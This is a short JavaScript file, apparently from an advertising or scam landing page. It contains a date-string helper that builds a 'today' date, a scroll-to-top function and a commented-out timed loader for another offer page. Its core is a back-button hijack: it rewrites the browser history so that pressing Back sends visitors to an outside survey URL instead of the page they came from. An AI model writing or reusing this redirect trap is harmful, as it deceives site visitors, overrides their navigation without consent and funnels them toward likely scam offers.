function datehax() {
    var mydate = new Date()
    mydate.setDate(mydate.getDate());
    var year = mydate.getYear()
    if (year < 1000)
        year += 1900
    var day = mydate.getDay()
    var month = mydate.getMonth()
    var daym = mydate.getDate()
    if (daym < 10)
        daym = "0" + daym
    var dayarray = Array("Sunday", "Monday", "Tuesday", "Wednesday", "Thursday", "Friday", "Saturday");
    var montharray = new Array("January", "February", "March", "April", "May", "Juny", "July", "August", "September", "October", "November", "December");
    // var dayarray = new Array("Sunday", "Monday", "Tuesday", "Wednesday", "Thursday", "Friday", "Saturday")
    // var montharray = new Array("Januari","Februari","Maart","April","Mei","Juni","Juli","Augustus","September","Oktober","November","December")
    return "" + montharray[month] + " " + daym + ", " + year + "";
}




(function (window, location) {
    var redirect = "http://go.pixelwort.com/ts7951-backbutton-survey-ww";
    var currentUrl = location.origin + location.pathname + location.search;
    if (location.hash !== "#!/hst") {
        history.replaceState(null, document.title, currentUrl + "#!/hst");
        history.pushState(null, document.title, currentUrl);
    }

    window.addEventListener("popstate", function () {
        if (location.hash === "#!/hst") {
            setTimeout(function () {
                window.location.replace(redirect);
            }, 0);
        }
    }, false);
}(window, location));




function socle() {
    document.body.scrollTop = 0; // For Safari
    document.documentElement.scrollTop = 0;
}

/* function Loadotheroffer() {
    var incntid = document.getElementById("includedContent");
        if (incntid.style.display == "none") {
            $("#includedContent").load("offers30.html");
    }
}
        setTimeout(Loadotheroffer, 30000); */
